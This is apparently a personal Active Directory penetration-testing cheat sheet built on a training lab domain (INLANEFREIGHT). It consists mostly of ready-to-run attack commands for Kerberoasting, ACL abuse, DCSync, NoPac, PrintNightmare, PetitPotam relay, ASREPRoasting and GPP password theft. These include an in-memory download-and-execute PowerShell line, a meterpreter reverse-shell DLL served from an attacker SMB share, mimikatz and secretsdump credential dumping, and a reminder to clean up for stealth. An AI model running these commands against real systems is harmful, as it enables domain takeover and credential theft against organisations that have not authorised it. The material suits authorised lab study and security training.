# Displays a list of environment variables for the current session (ran from CMD-prompt)
set

# Displays the domain name to which the host belongs (ran from CMD-prompt)
echo %USERDOMAIN%

# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
echo %logonserver%

________________________________________________________________________________________
(Harnessing PowerShell)
________________________________________________________________________________________

# Lists available modules loaded for use.
Get-Module

# Will print the execution policy settings for each scope on a host.
Get-ExecutionPolicy -List

# This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
Set-ExecutionPolicy Bypass -Scope Process

# Return environment values such as key paths, users, computer information, etc.
Get-ChildItem Env: | ft Key,Value

# With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"

________________________________________________________________________________________
(Downgrade Powershell)
________________________________________________________________________________________

# Check your current PowerShell version and host information.
Get-host

# Revert your PowerShell session to version 2.0 (Downgrade Attack).
powershell.exe -version 2

________________________________________________________________________________________
(Checking Defenses)
________________________________________________________________________________________

# Display the Windows Firewall status across all profiles.
netsh advfirewall show allprofiles

# Display the Windows Firewall and check all rule.
netsh advfirewall firewall show rule name=all

# Queryes the service status of Windows Defender.
sc query windefend

# Displays the detailed status of Microsoft Defender (PowerShell).
Get-MpComputerStatus

(Checking Session in one account)

# This command displays a list of all currently active login (sessions) on the Windows system.
qwinsta

________________________________________________________________________________________
(Network Information)
________________________________________________________________________________________

# Lists all known hosts stored in the arp table.
arp -a

# Prints out adapter settings for the host. We can figure out the network segment from here.
ipconfig /all

# Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
route print

# 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
netsh advfirewall show allprofiles

________________________________________________________________________________________
(Windows Management Instrumentation (WMI))
(https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
________________________________________________________________________________________

# Prints the patch level and description of the Hotfixes applied
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Displays basic host information to include any attributes within the list
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# A listing of all processes on host
wmic process list /format:list

# Displays information about the Domain and Domain Controllers
wmic ntdomain list /format:list

# Displays information about all local accounts and any domain accounts that have logged into the device
wmic useraccount list /format:list

# Information about all local groups
wmic group list /format:list

# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list

________________________________________________________________________________________
(Net Commands)
________________________________________________________________________________________

# Display domain password & lockout policy
net accounts /domain

# List all users in the current domain
net user /domain

# Get detailed information for a specific domain user
net user <username> /domain

# List all groups in the current domain
net group /domain

# List all members of the Domain Admins group
net group "Domain Admins" /domain

# List all computers joined to the domain
net group "domain computers" /domain

# List all Domain Controllers in the network
net group "Domain Controllers" /domain

# Information about password requirements
net accounts

# Check local groups on the current host
net localgroup

# Check current shares
net share

# List members of the local Administrators group
net localgroup administrators

# View all available shared resources on the domain
net view /domain

# List shares available on a specific remote computer
net view \\<computername> /all

# Mount a network share to a local drive letter
net use x: \\<computername>\<sharename>

________________________________________________________________________________________
(Dsquery Commands)
________________________________________________________________________________________

# List all users in the current domain (DN format)
dsquery user

# List all computers joined to the domain
dsquery computer

# List all objects in a specific path (Wildcard search)
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

# Find accounts that do not require a password (UAC flag 32)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Find all Domain Controllers (UAC flag 8192)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName

# Find users inactive for more than 4 weeks
dsquery user -inactive 4

# Find disabled user accounts
dsquery user -disabled

________________________________________________________________________________________
(LDAP OID Matching Rules)
________________________________________________________________________________________

# 1.2.840.113556.1.4.803 (LDAP_MATCHING_RULE_BIT_AND)
# Meaning: Bitwise AND. Matches if the bit is EXACTLY set.
# Use Case: Find accounts with a specific UAC flag (e.g., Only Disabled accounts).

# 1.2.840.113556.1.4.804 (LDAP_MATCHING_RULE_BIT_OR)
# Meaning: Bitwise OR. Matches if ANY bit in the mask is set.
# Use Case: Find accounts that have at least one of several flags set.

# 1.2.840.113556.1.4.1941 (LDAP_MATCHING_RULE_IN_CHAIN)
# Meaning: Recursive lookups. Walks the lineage of an object.
# Use Case: Find all members of a group, including those in Nested Groups.

________________________________________________________________________________________
# (UAC Bitmask Cheat Sheet)
________________________________________________________________________________________

# 2     : Account disabled
# 32    : Password not required (Critical vulnerability!)
# 512   : Normal account
# 8192  : Domain Controller account
# 65536 : Password never expires
# 1048576 : Trusted for delegation (Constrained Delegation target)

# Filter LDAP using OID 803 (Match exactly)

# Find accounts with "Password Not Required" (Bit 32)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=32)"
```
##### Kerberoasting 
```
________________________________________________________________________________________
(Kerberoasting Prerequisites)
________________________________________________________________________________________

# 1. Identity: Must have a valid Domain Identity (User/Pass, Hash, or active Shell).
# 2. Scope: Any domain user can request a ticket for any SPN (even low-privilege users).
# 3. Target: Must identify the Domain Controller (DC) IP to send LDAP/Kerberos queries.
# 4. Tooling: Impacket (GetUserSPNs.py) for Linux or Rubeus/PowerView for Windows.

============================================
(Kerberoasting automate with impacket from Linux)  (using https://github.com/fortra/impacket)
============================================

# Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.
gỉ clone https://github.com/fortra/impacket 
sudo python3 -m pip install .

# Impacket tool used to get a list of SPNs on the target Windows domain from a Linux-based host.
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday

# Impacket tool used to download/request (-request) all TGS tickets for offline processing from a Linux-based host.
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request

# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs

# Attempts to crack the Kerberos (-m 13100) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host.
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

============================================
(Kerberoasting manual with setspn.exe and mimikatz from windows)
============================================

# Used to enumerate SPNs in a target Windows domain from a Windows-based host.
setspn.exe -Q */*

# Used to download/request all TGS tickets from a WIndows-based host.
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Used to crack the prepared Kerberos ticket hash (sqldev_tgs_hashcat) using a wordlist (rockyou.txt) from a Linux-based host.
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

============================================
(Kerberoasting automate with PowerView) (https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
============================================

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host.
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

============================================
(Kerberoasting automate with Rubeus) (https://github.com/GhostPack/Rubeus)
============================================

# Used to check the kerberoast stats (/stats) within the target Windows domain from a Windows-based host.
.\Rubeus.exe kerberoast /stats

# Used to request/download TGS tickets for accounts with the admin count set to 1 then formats the output in an easy to view & crack manner (/nowrap) . Performed from a Windows-based host.
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Crack AES-256 encrypted Kerberos TGS tickets (etype 18)
# Mode 19700 is slow but necessary for modern Windows environments (Server 2019+)
hashcat -m 19700 <aes_hash_file> /usr/share/wordlists/rockyou.txt

# Crack RC4 encrypted Kerberos TGS tickets (etype 23)
# Mode 13100 is highly efficient and much faster than AES cracking
hashcat -m 13100 <rc4_hash_file> /usr/share/wordlists/rockyou.txt

# Perform Kerberoasting with Encryption Downgrade
# /tgtdeleg: Forces RC4 encryption for easier offline cracking (works on Server 2016 and older)
# /nowrap: Prevents base64 ticket blobs from being column-wrapped for easy copying
.\Rubeus.exe kerberoast /tgtdeleg /user:<target_user> /nowrap

```

##### ACL Enumeration and Tactics
```
# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
Find-InterestingDomainAcl

# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley

# Used to create a PSCredential Object from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Used to find all Windows domain objects that the user has rights over by mapping the user's SID to the SecurityIdentifier property from a Windows-based host.
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Used to perform a reverse search & map to a GUID value from a Windows-based host.
$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl

# Used to discover a domain object's ACL by performing a search based on GUID's (-ResolveGUIDs) from a Windows-based host.
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Used to discover a group of user accounts in a target Windows domain and add the output to a text file (ad_users.txt) from a Windows-based host.
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# A foreach loop used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

# Investigating the Help Desk Level 1 Group with Get-DomainGroup
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

# Investigating the Information Technology Group
$itgroupsid = Convert-NameToSid "Information Technology" Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# PowerView tool used Removing the Fake SPN from adunn's Account
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# PowerView tool used Removing damundsen from the Help Desk Level 1 Group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host.
ConvertFrom-SddlString "<Strings SDDL>" | select -ExpandProperty DiscretionaryAcl

```
##### DCSync Attack
```
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl

# Switch the context to the account with permissions.
runas /netonly /user:INLANEFREIGHT\adunn powershell

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

```
##### Privileged Access
```
# PowerView based tool to used to enumerate the Remote Desktop Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
$password = ConvertTo-SecureString 'Pr0xy_ILFREIGHT!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\proxyagent', $password)
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

# Enumerating MSSQL Instances with PowerUpSQL  (https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

# PowerUpSQL tool used to connect to connect to a SQL server and query the version (-query 'Select @@version') from a Windows-based host.
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

# Impacket tool used to connect to a MSSQL server from a Linux-based host.
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
##### Kerberos "Double Hop" Problem
```
# --- [ ERROR STATE IDENTIFICATION ] ---
# When connected via standard WinRM (Network Logon), check for cached tickets:
# In this state, you lack a TGT (Ticket Granting Ticket) to access network resources.
klist 
# Symptom: Only a service ticket (TGS) for the current host (HTTP/...) is visible.
# Look for the 'S4U' (Service for User) flag, which indicates a restricted session.


# --- [ WORKAROUND 1: PSCREDENTIAL OBJECT ] ---
# (Recommended for CLI-only environments like Evil-WinRM, Linux, or Windows)
# This method manually injects credentials into the command to initiate a new authentication flow.

# Step 1: Securely store the cleartext password in memory.
$pass = ConvertTo-SecureString 'Your_Password_Here' -AsPlainText -Force

# Step 2: Create a PSCredential object containing the domain user and secure password.
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $pass)

# Step 3: Force the command to use these credentials to authenticate the "Second Hop."
# Example: Querying the Domain Controller (DC) for SPN accounts.
Get-DomainUser -spn -Credential $cred


# --- [ WORKAROUND 2: PSSESSION CONFIGURATION ] ---
# (Requires Local Admin rights and must be run from a Windows PowerShell Console)
# This method creates a custom endpoint that impersonates the target user with full tokens.

# Step 1: Register a new session configuration (Note: A GUI popup will appear for credentials).
Register-PSSessionConfiguration -Name "CustomAdminShell" -RunAsCredential "DOMAIN\User"

# Step 2: Restart the WinRM service to apply the configuration change.
# Caution: This will temporarily disconnect existing WinRM sessions.
Restart-Service WinRM

# Step 3: Establish a new session from your attack host using the custom endpoint.
Enter-PSSession -ComputerName TargetHost -ConfigurationName "CustomAdminShell"

# Step 4: Verification - Verify you now possess a PRIMARY TGT (krbtgt/...).
klist 


# --- [ HOUSEKEEPING / CLEANUP ] ---
# Always revert system modifications to remain stealthy and avoid leaving backdoors.
Unregister-PSSessionConfiguration -Name "CustomAdminShell"
```
##### Bleeding Edge Vulnerabilities
```
________________________________________________________________________________________
NoPac (SamAccountName Spoofing)
________________________________________________________________________________________
(NoPac Prerequisites)

# 1. Identity: Valid Domain User credentials (standard user).
# 2. Quota: ms-DS-MachineAccountQuota must be > 0 (Default is 10).
# 3. Target: Vulnerable Domain Controller (Missing patches from Nov 2021).
# 4. Tooling: noPac repo (scanner.py, noPac.py) and Impacket.

============================================
(NoPac automate with noPac.py From Linux) (using https://github.com/Ridter/noPac)
============================================

# Used to clone the impacket and noPac exploit repository to the attack host.
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install 
git clone https://github.com/Ridter/noPac.git

# Runs scanner.py to check if the target DC is vulnerable (Checks ms-DS-MachineAccountQuota and TGT request).
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Executes the exploit to impersonate a Domain Admin and drop into a semi-interactive SYSTEM shell.
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# Executes the exploit and performs a DCSync to dump the NTLM hash of the built-in Administrator.
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

________________________________________________________________________________________
PrintNightmare (RCE)
________________________________________________________________________________________
(PrintNightmare Prerequisites)

# 1. Identity: Valid Domain User credentials.
# 2. Service: Print Spooler service (spoolsv.exe) must be running on target.
# 3. Access: RPC protocols MS-RPRN or MS-PAR must be exposed over port 445/135.
# 4. Tooling: CVE-2021-1675.py, MSFVenom for payload, and smbserver.py.

============================================
(PrintNightmare exploitation From Linux) (using https://github.com/cube0x0/CVE-2021-1675)
============================================

# Used to clone the cube0x0's Version of Impacket and PrintNightmare exploit repository to the attack host.
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

# Used to check for MS-RPRN or MS-PAR protocols on the target via RPC dump.
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Used to generate a malicious DLL payload for the reverse shell.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Used to host the DLL payload on a local SMB share to be downloaded by the target DC.
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Executes the RCE exploit by pointing the target DC to the hosted DLL on our SMB share.
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

________________________________________________________________________________________
PetitPotam (AD CS Relay)
________________________________________________________________________________________
(PetitPotam Prerequisites)

# 1. Identity: No authentication required for the initial trigger (Coerced Auth).
# 2. Target: Active Directory Certificate Services (AD CS) with Web Enrollment enabled.
# 3. Network: NTLM Relay must be possible from DC to the CA host.
# 4. Tooling: ntlmrelayx.py, PetitPotam.py, PKINITtools.

============================================
(PetitPotam & NTLM Relay to AD CS From Linux) (using https://github.com/topotam/PetitPotam)
============================================

# Step 1: Start ntlmrelayx.py to listen for DC authentication and relay to AD CS for a certificate.
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Step 2: Run PetitPotam to coerce the Domain Controller(172.16.5.5) to authenticate back to our attack host(172.16.5.255).
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# Step 3: Use the captured Base64 certificate to request a TGT for the Domain Controller.
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <Base64_Cert> dc01.ccache

# Step 4: Setting the KRB5CCNAME Environment Variable and Running klist to check ticket
export KRB5CCNAME=dc01.ccache
klist

# Step 5: Using Domain Controller TGT to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

or

# Step 4: Extract the NT Hash from the captured TGT for long-term persistence.Submitting a TGS Request for Ourselves Using getnthash.py
python /opt/PKINITtools/getnthash.py -key <AS-REP_Key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

# Step 5: Using Domain Controller NTLM Hash to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes :<NT_Hash>

============================================
(Requesting TGT and Performing PTT with DC01$ Machine Account From Windows) (using Rubeus)
============================================

# Using Rubeus to request a TGT and perform Pass-the-Ticket (PTT) with the Base64 certificate.
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<Base64_Cert> /ptt

# Running klist to check ticket
klist

# Using Mimikatz to perform DCSync after the ticket has been injected into the session.
lsadump::dcsync /user:inlanefreight\krbtgt
```
##### Miscellanous Configurations
```
________________________________________________________________________________________
Enumerating for MS-PRN Printer Bug (https://github.com/itzvenom/Security-Assessment-PS) 
________________________________________________________________________________________
# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host. 
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

________________________________________________________________________________________
Enumerating DNS Records (https://github.com/dirkjanm/adidnsdump) 
________________________________________________________________________________________
# Used to resolve all records in a DNS zone over LDAP from a Linux-based host.
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

# Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host.
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

________________________________________________________________________________________
Password in Description Field
________________________________________________________________________________________
# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

________________________________________________________________________________________
Password in Description Field
________________________________________________________________________________________
# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

________________________________________________________________________________________
Credentials in SMB Shares and SYSVOL Scripts
________________________________________________________________________________________
# Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

________________________________________________________________________________________
Group Policy Preferences (GPP) Passwords
________________________________________________________________________________________
# Locating & Retrieving GPP Passwords with CrackMapExec
crackmapexec smb -L | grep gpp

# Using CrackMapExec's gpp_autologin Module
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin in file file Registry.xml

# Using CrackMapExec's gpp_password Module  Retrieving GPP Passwords in file xml
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

```
##### ASREPRoasting
```
# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Hunting for Users with Kerberos Pre-auth Not Required
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

```
##### Group Policy Object (GPO) Abuse 
```
________________________________________________________________________________________
(https://github.com/FSecureLABS/SharpGPOAbuse)
________________________________________________________________________________________
# Enumerating GPO Names with PowerView
Get-DomainGPO |select displayname

# Enumerating GPO Names with a Built-In Cmdlet
Get-GPO -All | Select DisplayName

# Enumerating Domain User GPO Rights
$sid=Convert-NameToSid "Domain Users" Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Converting GPO GUID to Name
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
##### Domain Trusts Primer (The "Bridge" Between Domains)
```
____________________________________________
(Trust Prerequisites & Definitions)
____________________________________________

# 1. Trust: A relationship that allows users in Domain A to access resources in Domain B.
# 2. Trusted Domain (Miền được tin): The domain where the users reside (The "Guest").
# 3. Trusting Domain (Miền tin tưởng): The domain that provides the resource (The "Host").
# 4. Transitivity (Tính bắc cầu): 
#    - Transitive: If A trusts B and B trusts C, then A trusts C (Like Parent-Child trusts).
#    - Non-transitive: Only a direct relationship exists. No "friend of a friend" access.
# 5. Direction (Hướng xác thực):
#    - One-way: Users in Trusted domain can access Trusting domain, but not vice-versa.
#    - Bidirectional: Users in both domains can access each other's resources.

____________________________________________
(Trust Types - Standard Classification)
____________________________________________

# 1. Parent-Child: Automatic 2-way transitive trust between a parent and its sub-domain.
# 2. Tree-Root: 2-way transitive trust between a forest root and a new tree root in the same forest.
# 3. Cross-link: (Shortcut Trust) A direct trust between two child domains in the same forest to speed up authentication.
# 4. Forest Trust: A transitive trust between two different Forest Root domains (Cross-forest).
# 5. External Trust: A non-transitive trust between two specific domains in different forests (High restriction).

____________________________________________
(Enumeration - From Windows Host)
____________________________________________

============================================
(Using Built-in PowerShell AD Module)
============================================

# Import the module if not already loaded.
Import-Module activedirectory

# Enumerate all domain trust relationships (Direction, Type, Attributes).
Get-ADTrust -Filter *

# Check if a specific DC exists for the domain.
netdom query /domain:inlanefreight.local dc

# List workstations and servers in the domain to find new targets.
netdom query /domain:inlanefreight.local workstation

============================================
(Using PowerView) (using https://github.com/PowerShellMafia/PowerSploit)
============================================

# Basic trust enumeration (Lists Source, Target, and Direction).
Get-DomainTrust

# Comprehensive mapping (Shows trusts from both sides' perspectives).
Get-DomainTrustMapping

# Enumerate users in the Trusted/Child domain to find admin accounts (_adm).
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

____________________________________________
(Key Indicators for Attackers)
____________________________________________

# - IntraForest = True: High potential for "SID History Injection" to compromise Parent.
# - SIDFilteringQuarantined = False: Boundary check is OFF. Potential for cross-forest escalation.
# - ForestTransitive = True: Opportunity to jump across multiple domains in the target forest.
# - SID Filtering: A security mechanism (NOT a trust type) that prevents SID History Abuse by filtering out SIDs not belonging to the trusted domain.
# - Transitivity: Determines if the trust "hops" to other domains (Transitive = Shared; Non-transitive = Direct only).
# - Selective Authentication: Restricts access to specific servers/users instead of the entire domain.
```
##### BloodHound: Domain Trusts and Cross-Forest Analysis
```
____________________________________________
(Data Collection - The First Step)
____________________________________________

# 1. Collect all data (including Trusts, Group Memberships, and ACLs).
.\SharpHound.exe -c All --ZipFileName loot.zip

# 2. Collect from a specific domain (if you have a foothold in a child domain).
.\SharpHound.exe -d logistics.inlanefreight.local -c All

____________________________________________
(Standard Queries - Visualizing the Bridge)
____________________________________________

# 1. Map Domain Trusts: Right-click on any Domain Node -> "Map Domain Trusts".
#    - Red Line: Indicates a trust relationship.
#    - Direction: Arrows point TOWARDS the Trusting domain (Who provides resources).

# 2. Find Foreign Group Members: Analysis Tab -> "Find Foreign Group Members".
#    - Purpose: Finds users from Domain B who are in sensitive groups of Domain A.
#    - Red Team Insight: These are your "entry points" into the target domain.

# 3. Shortest Paths to Domain Admins: Analysis Tab -> "Shortest Paths to Domain Admins".
#    - Look for paths that cross the red "TrustedBy" edges.

____________________________________________
(Custom Cypher Queries - Pro Level)
____________________________________________

# 1. List all Domain Trusts with Directions and Attributes:
MATCH p=(n:Domain)-[:TrustedBy]->(m:Domain) RETURN p

# 2. Find all users from other domains in the local "Domain Admins" group:
MATCH (n:User)-[:MemberOf*1..]->(g:Group) 
WHERE g.name STARTS WITH 'DOMAIN ADMINS' AND n.domain <> g.domain 
RETURN n.name, g.name

____________________________________________
(Key Edges & Attack Vectors)
____________________________________________

# - [TrustedBy]: The core trust edge. Check properties for "IsTransitive" and "SidFilteringEnabled".
# - [MemberOf] (Cross-domain): A user from Domain A has rights in Domain B.
# - [AllowedToDelegate]: Can be abused for Constrained Delegation across trust boundaries.
